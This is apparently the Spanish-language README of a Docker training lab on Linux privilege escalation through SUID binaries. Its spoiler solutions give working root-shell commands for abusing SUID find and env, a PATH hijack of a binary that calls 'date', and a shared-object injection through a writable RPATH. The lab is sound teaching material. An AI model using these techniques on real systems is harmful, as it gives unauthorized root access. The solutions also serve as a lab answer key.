# 🔐 SUID Privilege Escalation Lab
 
Laboratorio de práctica para escalada de privilegios mediante abuso de binarios SUID en Linux.
 
## Requisitos
- Docker instalado
 
## Cómo usar
 
### Construir y ejecutar cada nivel
 
```bash
# Nivel 1 - Fácil
cd level1-easy
docker build -t suid-lab-easy .
docker run -it --rm suid-lab-easy
 
# Nivel 2 - Medio
cd level2-medium
docker build -t suid-lab-medium .
docker run -it --rm suid-lab-medium
 
# Nivel 3 - Difícil
cd level3-hard
docker build -t suid-lab-hard .
docker run -it --rm suid-lab-hard
```
 
### Dentro del contenedor
```bash
# Ver las instrucciones del nivel
./instrucciones.sh
 
# Comando clave para empezar SIEMPRE:
find / -perm -4000 -type f 2>/dev/null
```
 
---
 
## Resumen de niveles
 
| Nivel | Técnica principal | Binarios SUID | Dificultad |
|-------|-------------------|---------------|------------|
| 1     | SUID en binario conocido (find) | `find` | ⭐ |
| 2     | SUID en env + PATH Hijacking | `env`, `statuscheck` | ⭐⭐ |
| 3     | Shared Object Injection + rabbit hole | `security-monitor`, `backup-tool` | ⭐⭐⭐ |
 
---
 
## ⚠️ SOLUCIONES (SPOILERS ABAJO) ⚠️
 
<details>
<summary>Nivel 1 - Solución</summary>
 
`find` con SUID puede ejecutar comandos como root:
```bash
find / -perm -4000 -type f 2>/dev/null   # descubrir que find tiene SUID
find . -exec /bin/bash -p \;              # obtener shell root
cat /root/flag.txt
```
Referencia: https://gtfobins.github.io/gtfobins/find/
 
</details>
 
<details>
<summary>Nivel 2 - Solución (2 vías)</summary>
 
**Vía A: env con SUID**
```bash
env /bin/bash -p
cat /root/flag.txt
```
 
**Vía B: PATH Hijacking en statuscheck**
```bash
# statuscheck llama a "date" sin ruta absoluta
echo '/bin/bash -p' > /tmp/date
chmod +x /tmp/date
export PATH=/tmp:$PATH
statuscheck
# Ahora tienes shell root
cat /root/flag.txt
```
 
</details>
 
<details>
<summary>Nivel 3 - Solución</summary>
 
**1. Identificar binarios SUID:**
```bash
find / -perm -4000 -type f 2>/dev/null
# Se ven: security-monitor y backup-tool
```
 
**2. backup-tool es un rabbit hole** (sanitiza bien el input).
 
**3. Analizar security-monitor:**
```bash
strings /usr/local/bin/security-monitor
ltrace /usr/local/bin/security-monitor 2>&1
# Se ve que carga libcustomutils.so
# El rpath incluye /home/hacker/.config/lib ANTES que /usr/lib
```
 
**4. Shared Object Injection:**
```bash
cat <<'EOF' > /tmp/evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
void check_status() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
 
gcc -shared -fPIC -o /home/hacker/.config/lib/libcustomutils.so /tmp/evil.c
security-monitor
# Shell como root
cat /root/flag.txt
```
 
El truco es que el RPATH del binario busca en `~/.config/lib/` antes que en `/usr/lib/`,
y ese directorio es escribible por hacker.
 
</details>
 
---
 
## Recursos de aprendizaje
- [GTFOBins](https://gtfobins.github.io/) - Referencia de binarios explotables
- [HackTricks - SUID](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid) - Técnicas de privesc
- [Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)